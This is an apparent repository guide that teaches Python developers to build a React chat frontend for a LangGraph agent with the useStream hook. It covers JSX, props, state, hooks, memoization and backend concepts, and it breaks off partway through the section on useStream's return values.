# React + LangGraph Frontend Guide

A beginner's guide to building a React chat UI for a LangGraph agent with `@langchain/react` v1. It uses this repo's code as the running example, and the patterns come from the skill in `[langgraph-react-frontend/](langgraph-react-frontend/SKILL.md)`.

Read sections 1 to 5 in order. Sections 6 to 10 are patterns you can pick up when you need them. Section 13 is a glossary, and section 14 (Appendix A) holds the shared components the examples use.

## How to tell what is built in and what is custom

Every name in a code block is one of these:

1. **Imported.** The `import` line at the top of the block says where it comes from: `"react"`, `"@langchain/react"`, `"langchain"`, `"zod"`, and so on.
2. **Built into the browser or JavaScript.** Lowercase HTML tags (`<div>`, `<button>`, `<form>`) and globals such as `console`, `fetch`, `localStorage`, `window`, `navigator`, `Map`, `Set`, `JSON`, `String`.
3. **Custom (written by you).** These are always defined somewhere you can see:
  - in the same block,
  - in [Appendix A](#14-appendix-a-shared-components) (imported from `"./shared"` or `"./types"`), or
  - in this repo (with a link to the file).

Every snippet was typechecked against the installed `@langchain/react` 1.1.2 and the other libraries it imports. Every Python snippet was run.

---

## Contents

1. [The big picture](#1-the-big-picture)
2. [React basics you need](#2-react-basics-you-need)
3. [Backend concepts the frontend sees](#3-backend-concepts-the-frontend-sees)
4. `useStream`[: the one hook everything uses](#4-usestream-the-one-hook-everything-uses)
5. [This repo's chat, line by line](#5-this-repos-chat-line-by-line)
6. [Patterns: showing output](#6-patterns-showing-output)
7. [Patterns: showing agent actions](#7-patterns-showing-agent-actions)
8. [Patterns: managing conversations](#8-patterns-managing-conversations)
9. [Patterns: deep agents](#9-patterns-deep-agents)
10. [Patterns: custom graphs](#10-patterns-custom-graphs)
11. [Advanced hook features](#11-advanced-hook-features)
12. [Common mistakes](#12-common-mistakes)
13. [Glossary](#13-glossary)
14. [Appendix A: shared components](#14-appendix-a-shared-components)

---

## 1. The big picture

The project runs two separate programs that talk over HTTP:

```text
Browser (React app, localhost:4100)
   |
   |  stream.submit(...)  →  HTTP request to /api/langgraph/...
   v
Vite dev server (localhost:4100)
   |  proxy: strips /api/langgraph, forwards the request
   v
Agent Server (Python, 127.0.0.1:2024, started by `langgraph dev`)
   |  runs the graph "simple_agent" from agents/simple_agent.py
   |  calls Claude, streams events back
   v
Browser receives events over SSE → useStream updates → React re-renders
```

- The **frontend** never imports Python code. It only sends HTTP requests and reads the events that come back.
- The **backend language doesn't matter**. A Python or TypeScript backend exposes the same protocol, so the frontend code is identical. The only difference is how you write TypeScript types (see [4.7](#47-typing-the-state-for-a-python-backend)).
- **One hook,** `useStream`**, does all the connection work.** Everything else in this guide is either React UI around it or an extra feature of it.

---

## 2. React basics you need

Python equivalents are shown where one exists. They show the same mechanism written in Python; they aren't code you'd run in this project.

### 2.1 Reading TypeScript as a Python developer

Every code sample in this guide uses these pieces of syntax:


| TypeScript                                 | Python equivalent                                                    |
| ------------------------------------------ | -------------------------------------------------------------------- |
| `const x = 1` / `let x = 1`                | `x = 1` (`const` can't be reassigned)                                |
| `function f(a: string): number { ... }`    | `def f(a: str) -> int: ...`                                          |
| `(text) => submit(text)` (arrow function)  | `lambda text: submit(text)`                                          |
| `{ a: 1, b: 2 }` (object)                  | `{"a": 1, "b": 2}` (dict)                                            |
| `const { a, b = 5 } = obj` (destructuring) | `a = obj["a"]; b = obj.get("b", 5)`                                  |
| `const [x, setX] = useState(0)`            | `x, set_x = use_state(0)` (tuple unpacking)                          |
| `{ ...obj, b: 3 }` / `[...list, item]`     | `{**obj, "b": 3}` / `[*lst, item]`                                   |
| `list.map((x) => f(x))`                    | `[f(x) for x in lst]`                                                |
| `list.filter((x) => ok(x))`                | `[x for x in lst if ok(x)]`                                          |
| `list.find((x) => ok(x))`                  | `next((x for x in lst if ok(x)), None)`                              |
| `list.some(ok)` / `list.every(ok)`         | `any(ok(x) for x in lst)` / `all(...)`                               |
| `Hello ${name}`                            | `f"Hello {name}"`                                                    |
| `a === b`                                  | `a == b`                                                             |
| `null`, `undefined`                        | `None` (JS has two "no value" values)                                |
| `a?.b`                                     | `a.b if a is not None else None`                                     |
| `a ?? b`                                   | `a if a is not None else b` (not `a or b`: `??` keeps `0` and `""`)  |
| `cond ? x : y`                             | `x if cond else y`                                                   |
| `string                                    | null`                                                                |
| `"running"                                 | "finished"`                                                          |
| `Record<string, unknown>`                  | `dict[str, Any]`                                                     |
| `new Map()` / `new Set()`                  | `dict()` / `set()`                                                   |
| `interface S { a: string; b?: number }`    | `class S(TypedDict): a: str; b: NotRequired[int]`                    |
| `useStream<AgentState>(...)` (generic)     | a type parameter, like `list[int]`                                   |
| `x as Foo`                                 | `typing.cast(Foo, x)`                                                |
| `async` / `await` / `Promise`              | `async` / `await` / coroutine                                        |
| `void promise`                             | call without awaiting (fire and forget)                              |
| `import { a } from "x"`                    | `from x import a`                                                    |
| `export function f`                        | a module-level `def` (Python makes everything importable by default) |


#### Imports: when to use `{}`

It depends on how the file or package **exported** the thing:

- **No `{}`**: for the **default export**, the one main thing a file exports. You can choose any name when you import it.
- **With `{}`**: for **named exports**. There can be many per file, and you must use the exact name.

```ts
// how a file exports
export default function ReactMarkdown() { ... }   // default: only one per file
export function marked() { ... }                  // named: any number
```

```ts
// how you import
import ReactMarkdown from "react-markdown";       // default → no {}
import { marked } from "marked";                  // named   → {} with the exact name
import { useState, useEffect } from "react";      // several named ones
import { marked as md } from "marked";            // rename a named one with `as`
import type { BaseMessage } from "langchain";     // types only; removed when compiled
```

This repo shows the "any name" rule. [preview.tsx](packages/frontend/src/patterns/markdown-messages/preview.tsx) has `export default function MarkdownMessagesChat()`, and [App.tsx](packages/frontend/src/App.tsx) imports it as `import PatternPreview from "./patterns/markdown-messages/preview"`.

To know which form to use, follow the package's README example. If you pick the wrong one, TypeScript says "has no default export" (add `{}`) or "has no exported member" (remove them).

### 2.2 Component

A component is a function that returns JSX, the HTML-like markup. Its name starts with a capital letter.

```tsx
export function TypingIndicator() {
  return <div className="flex gap-1.5">...</div>;
}
```

From [TypingIndicator.tsx](packages/frontend/src/components/chat/TypingIndicator.tsx).

Python equivalent: a function that returns a **description** of what to show. It doesn't draw anything itself:

```python
def TypingIndicator():
    return {"type": "div", "props": {"className": "flex gap-1.5", "children": "..."}}
```

That dict shape is literally what React produces (see the next section).

### 2.3 JSX, and why `<X />`

JSX looks like HTML but isn't. The compiler turns every tag into a **function call**. Here is the real output from compiling three lines with esbuild, using the same JSX mode Vite uses.

Setup for this example. Everything here is custom and defined right here; only `<span>` and `<p>` are built in:

```tsx
function X({ name }: { name?: string }) {       // a tiny custom component
  return <span>{name}</span>;
}
const ok = true;
const items = [{ id: "1", name: "a" }, { id: "2", name: "b" }];
const msg = { text: "hello" };
```

```tsx
// what you write
const el   = <p>{msg.text}</p>;
const a    = ok && <X />;
const list = items.map((item) => <X key={item.id} name={item.name} />);
```

```js
// what the compiler produces
const el   = jsx("p", { children: msg.text });
const a    = ok && jsx(X, {});
const list = items.map((item) => jsx(X, { name: item.name }, item.id));
```

And `jsx(...)` returns a plain object. This was checked by running React 19:

```js
jsx(X, { name: "a" }, "id-1")
// → { type: X, key: "id-1", props: { name: "a" } }
```

So `<X name="a" />` means "create an object saying: render component `X` with props `{name: "a"}`." It does **not** call `X` right away. React calls `X(props)` itself when it renders.

- `<X />` is the self-closing form: `X` with no children. `<X>...</X>` puts the `...` into `props.children`.
- A **lowercase** tag (`<p>`) is a built-in HTML element, passed as the string `"p"`. A **capitalized** tag (`<X>`) is your component, passed as the function `X`. That's why component names must start with a capital letter.
- A component returns JSX because it has to return that description object. `return <X />` means "return the object for X."

The same three lines as Python:

```python
from types import SimpleNamespace as obj           # lets us write item.id like in JS

def X(name=None):                                  # the same tiny component
    return {"type": "span", "props": {"children": name}}

ok = True
items = [obj(id="1", name="a"), obj(id="2", name="b")]
msg = obj(text="hello")

el   = {"type": "p", "props": {"children": msg.text}}
a    = {"type": X, "props": {}} if ok else None
lst  = [{"type": X, "key": item.id, "props": {"name": item.name}} for item in items]
```

Syntax rules inside JSX:


| JSX                                   | Meaning                                      | Python equivalent                 |
| ------------------------------------- | -------------------------------------------- | --------------------------------- |
| `className="..."`                     | CSS class (`class` is a reserved word in JS) | `class` is reserved in Python too |
| `<p>{msg.text}</p>`                   | Insert a value                               | `f"<p>{msg.text}</p>"`            |
| `{cond && <X />}`                     | `X` only if `cond` is true                   | `X if cond else None`             |
| `{cond ? <A /> : <B />}`              | `A` or `B`                                   | `A if cond else B`                |
| `{list.map((i) => <X key={i.id} />)}` | One `X` per item                             | `[X for i in lst]`                |


> Watch out: `{count && <X />}` shows a literal `0` when `count` is `0`, because `&&` returns `0` and React renders numbers. Write `{count > 0 && <X />}`.

#### The single `{}` rule, and why some props need `{{ }}`

In JSX, a single pair of braces `{ }` acts as a portal into JavaScript. It tells React: "Stop treating this as a raw string, and evaluate the JavaScript expression inside."

When you write:

```tsx
<span>{isActive ? "Online" : "Offline"}</span>
```

the JavaScript expression inside is `isActive ? "Online" : "Offline"`, and the single `{}` wraps it.

**Why `dangerouslySetInnerHTML` needs `{{ }}`.** `dangerouslySetInnerHTML` doesn't accept a simple string or boolean. It requires an object (a dictionary) as its value, shaped like `{ __html: text }`. So when you write:

```tsx
<div dangerouslySetInnerHTML={{ __html: text }} />
```

you're combining two separate rules:

1. **Outer `{ }`** tells JSX: "Here comes a JavaScript value."
2. **Inner `{ }`** creates the JavaScript object (dictionary) `{ __html: text }`.

The same happens with `style={{ width: "50%" }}`: the outer braces are JSX, and the inner ones are an object. What `dangerouslySetInnerHTML` does, and why it's dangerous, is in 6.1.

### 2.4 key

`key={item.id}` is **not a prop**. The compiled output above shows it goes in a separate third argument, `jsx(X, props, item.id)`, and the component can't read it (`props.key` is `undefined`). React only uses it to **match items between the previous render and the new one**.

Here's why that matters. The list was `[A, B]`, and a new item `C` is added at the front, giving `[C, A, B]`:

- **With keys**, React matches by id. It sees `C` is new and `A` and `B` are unchanged, so it creates only `C`.
- **Without keys**, React matches by position. It thinks slot 0 changed from A to C, slot 1 from B to A, and slot 2 (B) is new. It updates every item, and any state inside them (for example, whether a card is expanded) ends up on the wrong item.

Python equivalent of what React does:

```python
from types import SimpleNamespace as obj

def reuse(el):   print("keep", el)                 # stand-ins for React's internal work
def create(item): print("create", item.id)

new_list = [obj(id="c"), obj(id="a"), obj(id="b")]  # [C, A, B]: C was added at the front

previous = {"a": "A_element", "b": "B_element"} # last render, stored by key
for item in new_list:                          # [C, A, B]
    if item.id in previous:
        reuse(previous[item.id])               # same key → keep the element and its state
    else:
        create(item)                           # new key → make a new element
# Without keys it's effectively zip(old_list, new_list): matching by position.
```

Rules:

- The key must be unique among the items in that list.
- It must be stable: the same item gets the same key on every render. Use an id, not the array index.
- Tool call cards should be keyed by `callId` (section 7).

```tsx
// AIBubble: this repo's component, defined in components/chat/Bubble.tsx
{stream.messages.map((msg) => <AIBubble key={msg.id}>...</AIBubble>)}
```

`AIBubble` is defined in [Bubble.tsx:35-44](packages/frontend/src/components/chat/Bubble.tsx#L35-L44).

### 2.5 Props

Here is how the entire code flows, broken down into its file structure, code execution order, and runtime flow.

The parent must pass its data down as props:

- preview.tsx (Parent) knows *if the AI is currently thinking* (`stream.isLoading`).
- ChatInput.tsx (Child) only knows *how to draw an HTML input and button*.

Without passing props, `ChatInput` would have no idea whether to enable or disable its button, nor would it know what function to call when the user clicks "Send".  
Passing props allows the parent to control the child's behavior (`disabled={stream.isLoading}`) while letting the child notify the parent when an event happens (`onSubmit={handleSubmit}`).

#### 1. Code layout in files

Because React uses separate files for components, the definition and the call site live in two places.

**File 1:** `ChatInput.tsx` **(child component)**

First, you define the TypeScript interface and the component function:

```tsx
import React from "react";

// STEP 1: Define the Interface (The Blueprint)
interface ChatInputProps {
  onSubmit: (text: string) => void;
  disabled?: boolean;
}

// STEP 2: Define & Export the Component (The Worker)
export function ChatInput({ onSubmit, disabled = false }: ChatInputProps) {
  return (
    <button disabled={disabled} onClick={() => onSubmit("Hello!")}>
      Send
    </button>
  );
}
```

**File 2:** `preview.tsx` **(parent screen)**

Then, you import the component and call it in your screen layout:

```tsx
import { ChatInput } from "@/components/chat/ChatInput";

export default function Preview() {
  const isLoading = false;
  const handleSubmit = (text: string) => console.log(text);

  // STEP 3: Call/Render the Component with real values
  return <ChatInput onSubmit={handleSubmit} disabled={isLoading} />;
}
```

#### 2. The execution and order breakdown


| Order             | Phase                            | What happens                                                                                                                                           |
| ----------------- | -------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------ |
| 1. Definition     | `interface ChatInputProps`       | TypeScript checks the types before running. It specifies: "This component requires an `onSubmit` function and accepts an optional `disabled` boolean." |
| 2. Implementation | `export function ChatInput(...)` | Creates the reusable JavaScript function that accepts props and returns HTML buttons/inputs.                                                           |
| 3. Call site      | `<ChatInput ... />`              | The parent calls the function, passing live state (`stream.isLoading`) and logic (`handleSubmit`).                                                     |
| 4. Rendering      | DOM output                       | React passes the values down, rendering Send into the actual browser page.                                                                             |


#### 3. The flow

`preview.tsx` returns `<ChatInput onSubmit={handleSubmit} disabled={isLoading} />` → React calls `ChatInput({ onSubmit: handleSubmit, disabled: false })` → `ChatInput` returns `<button disabled={false}>Send</button>` → the browser shows an enabled Send button → the user clicks it → `onClick` runs `onSubmit("Hello!")`, which is the parent's `handleSubmit("Hello!")` → it logs `Hello!`. In the real app, `handleSubmit` calls `stream.submit(...)` instead. While the agent replies, `stream.isLoading` is `true` → `preview.tsx` re-renders → React calls `ChatInput` again with `disabled: true` → the button is greyed out until the reply finishes.

Python equivalent: props are keyword arguments, the interface is the parameter list with type hints, and a function prop is a callback:

```python
from typing import Callable

def ChatInput(on_submit: Callable[[str], None], disabled: bool = False, placeholder: str = "Type a message..."):
    # when Send is clicked:  on_submit(text)
    ...

def handle_submit(text: str):
    print("send to agent:", text)     # in the real app: stream.submit(...)

is_loading = False                    # in the real app: stream.isLoading
ChatInput(on_submit=handle_submit, disabled=is_loading)
```

### 2.6 children

`children` is a special prop: whatever is written between a component's opening and closing tags.

```tsx
<AIBubble>
  <Markdown>{msg.text}</Markdown>   {/* this is AIBubble's `children` */}
</AIBubble>
```

Both are this repo's components: `AIBubble` is in [Bubble.tsx:35-44](packages/frontend/src/components/chat/Bubble.tsx#L35-L44) and `Markdown` is in [Markdown.tsx:10-37](packages/frontend/src/components/Markdown.tsx#L10-L37). `AIBubble` puts `{children}` inside its styled `<div>`.

Python equivalent: a keyword argument named `children`.

```python
def Markdown(children):                            # stand-ins for the two components
    return {"type": "markdown", "props": {"children": children}}

def AIBubble(children):
    return {"type": "div", "props": {"className": "bubble", "children": children}}

AIBubble(children=Markdown(children="**hello**"))
```

### 2.7 State and `useState`

State is a value a component remembers between renders. `useState` returns the current value and a setter function. Calling the setter makes React re-render the component with the new value.

```tsx
const [text, setText] = useState("");                           // ChatInput.tsx: what's typed in the box
const [threadId, setThreadId] = useState<string | null>(null);  // preview.tsx: current conversation
```

**Why a setter, and not just** `text = "new"`**?** A component function runs again from the top on every render, so a normal local variable is reset each time. React stores the value outside the function. The setter both saves the new value and tells React to re-render.

Python equivalent: a class where setting the value triggers a redraw:

```python
class ChatInput:
    def __init__(self):
        self.text = ""              # useState("")

    def set_text(self, value):      # setText
        self.text = value
        self.render()               # the setter is what triggers the re-render

    def render(self):
        print(f"<input value={self.text!r}>")

ChatInput().set_text("hi")          # prints: <input value='hi'>
```

### 2.8 Re-render

A re-render means React calls your component function again, compares the new description objects (section 2.3) with the previous ones, and changes only the parts of the page that differ. It happens when state changes, when props change, or when a hook such as `useStream` reports new data.

Python equivalent:

```python
def App(state):                                  # a component
    return {"type": "p", "props": {"children": state["count"]}}

def diff(old, new):                              # stand-ins for React's internal work
    return [] if old == new else [new]

def apply_changes(changes):
    for c in changes:
        print("update screen:", c)

old = App({"count": 0})
new = App({"count": 1})           # state changed → call the component again
apply_changes(diff(old, new))     # update only what changed on screen
old = new
```

### 2.9 Hooks

A hook is a function whose name starts with `use`. Hooks give a component state or a connection to something. They can only be called at the top level of a component, not inside `if` blocks or loops, because React identifies each hook by its **call order**.


| Hook                      | What it does                                                            | Python equivalent                                            |
| ------------------------- | ----------------------------------------------------------------------- | ------------------------------------------------------------ |
| `useState`                | Remember a value; changing it re-renders                                | Instance attribute plus a setter that calls `render()` (2.7) |
| `useRef`                  | Remember a value **without** re-rendering; also points at a DOM element | Plain instance attribute: `self.scroll_el = None`            |
| `useEffect`               | Run code **after** a render (fetch, scroll, subscribe)                  | A post-render callback: `render(); after_render()`           |
| `useMemo` / `useCallback` | Reuse a computed value / function until its inputs change               | `functools.lru_cache` on a value / function                  |
| `useStream`               | Connect to the agent and track the conversation                         | `langgraph_sdk` client (section 4.8)                         |


`useRef` + `useEffect` example from [ChatContainer.tsx:17-34](packages/frontend/src/components/chat/ChatContainer.tsx#L17-L34), which scrolls the message list to the bottom after every render (shortened):

```tsx
import { useEffect, useRef, type ReactNode } from "react";

export function ChatContainer({ children }: { children: ReactNode }) {
  const scrollRef = useRef<HTMLDivElement>(null);   // will point at the <div> below

  useEffect(() => {                                  // runs after every render
    const el = scrollRef.current;                    // the real DOM element
    if (el) el.scrollTop = el.scrollHeight;          // scroll to the bottom
  });

  return <div ref={scrollRef} className="overflow-y-auto">{children}</div>;
}
```

### 2.10 memo and useCallback (optional: speed only)

This repo uses neither, and the chat works fine without them. They only make long chats faster, so you can skip this section on a first read.

#### 2.10.1 memo

**What's on screen:**

- `Bubble` is one message box. It shows one message's text as formatted markdown.
- `MessageList` is the whole chat: one `Bubble` per message.

**The problem.** While the agent replies, new words arrive many times per second. Each time, React redraws `MessageList` and **every** `Bubble` in it, including old messages whose text didn't change.

**The fix is `memo`.** `memo(Bubble)` tells React: before redrawing a bubble, compare its props with last time, and skip it if they're the same.

```tsx
import { memo } from "react";
import type { BaseMessage } from "langchain";
import { Markdown } from "@/components/Markdown";   // this repo's component: shows markdown text as HTML

function Bubble({ text }: { text: string }) {       // one message box
  return <Markdown>{text}</Markdown>;
}

const MemoBubble = memo(Bubble);                    // same box, skipped when `text` is unchanged

function MessageList({ messages }: { messages: BaseMessage[] }) {   // messages = stream.messages
  return <div>{messages.map((msg) => <MemoBubble key={msg.id} text={msg.text} />)}</div>;
}
```

Now when a new word arrives in the last message, only that bubble is redrawn.

**The trap: passing a new function as a prop**

Say clicking a bubble should remember which message was clicked. The obvious way breaks `memo`:

```tsx
onClick={() => setClickedId(msg.id)}     // WRONG with memo
```

`() => ...` creates a **brand-new function every redraw**. Two functions are never equal, even with identical code (`(() => 1) === (() => 1)` is `false`). So `memo` sees `onClick` as changed and redraws every bubble again.

**Fix:** give the bubble its own `id`, and pass the setter from `useState` itself. React keeps that setter as the **same function** on every redraw, so nothing looks changed:

```tsx
import { memo, useState } from "react";
import { Markdown } from "@/components/Markdown";

const SelectableBubble = memo(function Bubble({ id, text, onSelect }: {
  id: string; text: string; onSelect: (id: string) => void;
}) {
  return <div onClick={() => onSelect(id)}><Markdown>{text}</Markdown></div>;
});

function MessageList({ messages }: { messages: { id: string; text: string }[] }) {
  const [clickedId, setClickedId] = useState<string | null>(null);   // which message was clicked
  return (
    <div>
      <p>Clicked: {clickedId ?? "none"}</p>
      {messages.map((msg) => (
        <SelectableBubble key={msg.id} id={msg.id} text={msg.text} onSelect={setClickedId} />
      ))}
    </div>
  );
}
```

The `() => onSelect(id)` inside the bubble is fine, because it's created inside the bubble and not passed in as a prop.

I tested this in React 19. When a word arrives in the last message, only that bubble redraws, and clicking still saves the id.

#### 2.10.2 useCallback

In the fix above, the setter from `useState` could be passed directly. If clicking should do more (for example, also log something), you have to write your own function. That's when you need `useCallback`:

```tsx
import { useCallback, useState } from "react";

function MessageList() {
  const [clickedId, setClickedId] = useState<string | null>(null);

  const select = useCallback((id: string) => {
    console.log("clicked", id);
    setClickedId(id);
  }, []);

  return <p>Clicked: {clickedId ?? "none"}</p>;   // pass onSelect={select} to the bubbles, as in 2.10.1
}
```

**What `useCallback` does**

By default, every function inside a component is created again each time the screen redraws.

`useCallback` tells React: "Freeze this function in memory. Reuse the exact same copy on every re-render."

**What the dependency array `[]` means**

The second argument, `[]`, tells React when to throw away the old function and create a new one.

- **`useState(null)` vs `useCallback(..., [])`:**
  - In `useState(null)`, `null` is the starting value of your state.
  - In `useCallback`, `[]` is a watchlist of the variables the function depends on.
- **Why is `[]` empty here?** Look at what's inside the function:

  ```tsx
  console.log("clicked", id);
  setClickedId(id);
  ```

  It doesn't use any state or props from outside. `id` is passed in as an argument, and React guarantees `setClickedId` never changes. Because nothing from outside influences this function, its watchlist is empty (`[]`). React creates it once, the first time the component renders, and reuses it forever.

**Why use `useCallback` here?**

The function never changes in memory, so you can pass `onSelect={select}` down to `memo` child components without accidentally forcing them to re-render.

**Python equivalent:** "new function every redraw" versus "same function":

```python
def redraw():
    return lambda id: print(id)        # like () => ... : a new function every call

print(redraw() is redraw())            # False → memo thinks the prop changed

saved = {}
def redraw_with_callback():
    if "select" not in saved:
        saved["select"] = lambda id: print(id)   # like useCallback(..., []): created once
    return saved["select"]

print(redraw_with_callback() is redraw_with_callback())   # True → memo sees the same prop
```

### 2.11 Side effects: making them run only once

**What is this for?** Say the agent edits a file with a tool. When the tool's result arrives, your UI should re-download that file to show the new content. That's `refreshFile` below. Logging each tool result to analytics would work the same way.

#### What is a "side effect"?

A side effect is any action your React component takes that affects the world outside of drawing HTML on the screen.

- **Examples:** fetching data from an API, writing to a database, updating a file, or logging analytics.
- **Why it matters:** running a side effect twice by mistake could mean sending duplicate network requests, refreshing files unnecessarily, or saving double records.

In React, side effects go inside `useEffect`, which runs **after** a render.

#### What is a "ref" (`useRef`)?

A ref is a private, persistent storage box attached to a component.

- **It remembers data:** whatever you put inside `ref.current` stays there across screen redraws.
- **It stays silent:** unlike `useState`, updating a `useRef` does **not** cause the component to re-render.

#### Why the effect runs more than once

There are two reasons. The first one matters most:

1. **It re-runs on every token.** `useEffect(..., [messages])` runs again every time `messages` changes. While the agent streams, that's on every new word, and the loop goes over **all** messages each time. So an old tool result would be refreshed again and again.
2. **StrictMode runs it one extra time in development**, on purpose, to find bugs.

I tested one tool result followed by 3 streamed tokens:

| | Normal mode | StrictMode (dev) |
| --- | --- | --- |
| Without the guard | `refreshFile` ran 4 times | 5 times |
| With the `useRef` guard | 1 time | 1 time |

So the guard is needed in production too, not only in development.

#### The code

```tsx
import { useEffect, useRef } from "react";
import { ToolMessage, type BaseMessage } from "langchain";

function refreshFile(msg: ToolMessage) {             // custom: your side effect
  console.log("refresh the file changed by", msg.name);
}

function useRefreshOnToolResult(messages: BaseMessage[]) {
  const processed = useRef(new Set<string>());

  useEffect(() => {
    for (const msg of messages) {
      if (!ToolMessage.isInstance(msg) || !msg.id) continue;

      // 1. Check if already handled
      if (processed.current.has(msg.id)) continue;

      // 2. Remember this ID
      processed.current.add(msg.id);

      // 3. Perform the side effect
      refreshFile(msg);
    }
  }, [messages]);
}
```

`useRefreshOnToolResult` is a **custom hook**: a function you write whose name starts with `use` and which calls other hooks. You call it at the top of a component, for example `useRefreshOnToolResult(stream.messages)`.

#### What the code does, step by step

1. **`useRef(new Set())` (memory notepad):** creates a set to store message IDs. It stays alive between re-renders without forcing the component to redraw.
2. **`if (processed.current.has(msg.id)) continue;` (the guard):** checks if the message was already processed. If it was, it skips it.
3. **`processed.current.add(msg.id)` (mark as done):** saves the ID into memory, so future runs know it has been handled.
4. **`refreshFile(msg)` (the side effect):** refreshes the file only once, for new messages.

#### Summary

- **Side effect:** the external action you want to trigger (e.g. `refreshFile()`).
- **Ref:** the memory notepad (`Set`) you use to check "Have I already refreshed this file?", so the side effect only runs once, no matter how many times the effect re-runs.

Python equivalent:

```python
def refresh_file(msg):
    print("refresh", msg["id"])

processed = set()
def on_tool_result(msg):
    if msg.id in processed:
        return                  # already handled; second call does nothing
    processed.add(msg.id)
    refresh_file(msg)
```

---

## 3. Backend concepts the frontend sees

- **Agent Server**: the Python process started by `langgraph dev` (port 2024 here). The frontend's `apiUrl` points at it, not at the React dev server.
- **Graph**: the agent's program, made of steps called **nodes**. `create_agent(...)` in [simple_agent.py](packages/agent/agents/simple_agent.py) builds one.
- `langgraph.json`: registers graphs by key. Here `"simple_agent": "./agents/simple_agent.py:agent"`.
- **assistantId**: the graph's **key** in `langgraph.json` (`"simple_agent"`). It's not a model name or a display label.
- **Thread**: one conversation stored on the server, identified by `threadId`. Using the same `threadId` again gives you the same conversation and state.
- **Run**: one execution of the graph on a thread. Every `submit()` starts a run.
- **State (values)**: the data the graph keeps, such as `messages` and optionally `todos` or `files`. The frontend reads it as `stream.values`.
- **Checkpoint**: a saved copy of the state after each graph step. It requires a **checkpointer** (persistence) on the backend. Editing messages, time travel, interrupts and rejoin all rely on checkpoints. If those features silently do nothing, check the backend's persistence first.
- **Messages**: typed objects in `state.messages`:
  - `HumanMessage`: from the user.
  - `AIMessage`: from the model. It may contain `tool_calls`.
  - `ToolMessage`: the result of a tool call.
  - Check the type with `AIMessage.isInstance(msg)`. Read the text with `msg.text`.
- **Tool call**: the model requesting a function run, with `name`, `args` and `id`. The result comes back as a `ToolMessage` with the same id.
- **Interrupt**: the graph pauses itself inside a node and waits for a value from outside, for example a human approval. The pause is saved in a checkpoint, so it survives a page refresh. The frontend answers with `stream.respond(value)`.
- **Subgraph / subagent**: a graph running inside another graph. Its events carry a **namespace**, a path like `["task:abc"]`. The top-level graph (the **root**) has namespace `[]`.
- **Streaming / SSE**: Server-Sent Events. The HTTP response stays open and the server writes events into it over time (message tokens, state updates, tool events). This is why text appears word by word. WebSocket is an alternative transport.

### What these look like on the Python side

The backend is Python, so these concepts are real Python objects there:

```python
# The graph: packages/agent/agents/simple_agent.py
from langchain.agents import create_agent
from langchain.chat_models import init_chat_model
agent = create_agent(model=init_chat_model("anthropic:claude-haiku-4-5"))

# Messages: the same classes the frontend imports from "langchain"
from langchain_core.messages import HumanMessage, AIMessage, ToolMessage
HumanMessage("hi")                                  # frontend: { type: "human", content: "hi" }

# State: what the frontend reads as stream.values
from typing import TypedDict
class AgentState(TypedDict):
    messages: list                                   # frontend: stream.messages

# Interrupt: pause inside a tool or node, wait for the frontend's answer
from langgraph.types import interrupt
def send_email(to: str, body: str):
    answer = interrupt({"question": f"Send email to {to}?"})   # frontend: stream.interrupt.value
    if answer["approved"]:                                       # frontend sent stream.respond({ approved: true })
        ...
```

---

## 4. `useStream`: the one hook everything uses

Source: [01-core-api.md](langgraph-react-frontend/references/01-core-api.md)

### 4.1 Minimal chat

```tsx
import { useStream } from "@langchain/react";
import { AIMessage, HumanMessage } from "langchain";
import type { AgentState } from "./types";                      // Appendix A
import { AGENT_URL, AssistantBubble, Composer, ErrorBanner, UserBubble } from "./shared";  // Appendix A

export function Chat() {
  const stream = useStream<AgentState>({
    apiUrl: AGENT_URL,        // the Agent Server
    assistantId: "agent",     // key under "graphs" in langgraph.json
  });

  return (
    <div>
      {stream.messages.map((msg) => (
        <div key={msg.id}>
          {HumanMessage.isInstance(msg) && <UserBubble text={msg.text} />}
          {AIMessage.isInstance(msg) && <AssistantBubble text={msg.text} />}
        </div>
      ))}
      <Composer
        disabled={stream.isLoading}
        onSend={(text) => stream.submit({ messages: [new HumanMessage(text)] })}
      />
      {stream.isLoading && <button onClick={() => void stream.stop()}>Stop</button>}
      {stream.error != null && <ErrorBanner error={stream.error} />}
    </div>
  );
}
```

**What each import does:**

- `react`: React itself. Components and hooks such as `useState` come from here.
- `@langchain/react`: the React side of LangGraph: `useStream` and the other hooks that talk to the Agent Server.
- `langchain`: LangChain's message classes (`HumanMessage`, `AIMessage`), `tool()`, and shared types such as `BaseMessage`.

**What each piece does:**

- `Chat`: the whole chat screen: the list of messages, the message box, a Stop button, and an error box.
- `UserBubble`: shows one message the user sent.
- `AssistantBubble`: shows one reply from the AI, formatted as markdown.
- `Composer`: the message box where the user types their question, plus a Send button. When Send is clicked, it calls `onSend(text)`.
- `ErrorBanner`: a red box showing what went wrong, for example when the server can't be reached.

The last four are defined in [Appendix A](#14-appendix-a-shared-components). This repo's versions are [ChatInput.tsx](packages/frontend/src/components/chat/ChatInput.tsx) (Composer) and `HumanBubble` / `AIBubble` in [Bubble.tsx](packages/frontend/src/components/chat/Bubble.tsx).

Call `useStream` **once per thread**. Pass the returned `stream` down to child components as a prop, or share it with `StreamProvider` ([11.3](#113-streamprovider-sharing-one-stream)).

### 4.2 Options you pass in


| Option                              | Meaning                                                                                                          |
| ----------------------------------- | ---------------------------------------------------------------------------------------------------------------- |
| `apiUrl`                            | Agent Server URL. In this repo: `${window.location.origin}/api/langgraph` (through the Vite proxy).              |
| `assistantId`                       | Graph key from `langgraph.json`.                                                                                 |
| `threadId`                          | Which conversation. `null` starts a new thread on the next submit. Changing it loads that thread.                |
| `onThreadId`                        | Called with the new id when the server creates a thread. Save it here (state, `localStorage`).                   |
| `initialValues`                     | State to show before the first server data arrives.                                                              |
| `messagesKey`                       | Which state key holds messages. Default `"messages"`.                                                            |
| `onCreated`                         | Called when the server accepts a run.                                                                            |
| `onCompleted`                       | Called when a run ends; `reason` is `"success"`, `"error"`, `"interrupt"` or `"stopped"`.                        |
| `tools` / `onTool`                  | Headless tools (section 7.2).                                                                                    |
| `optimistic`                        | Show submitted messages immediately. Default `true`.                                                             |
| `apiKey`, `defaultHeaders`, `fetch` | Auth and networking. Don't ship secret keys to the browser; proxy through your own backend in production (11.5). |
| `transport`                         | `"sse"` (default) or `"websocket"`, or a custom adapter (11.5).                                                  |


### 4.3 What you get back


| Field                                       | Meaning                                                                                             |
| ------------------------------------------- | --------------------------------------------------------------------------------------------------- |
| `messages`                                  | The conversation (root graph only), updated live as tokens arrive.                                  |
| `values`                                    | The full current graph state.                                                                       |
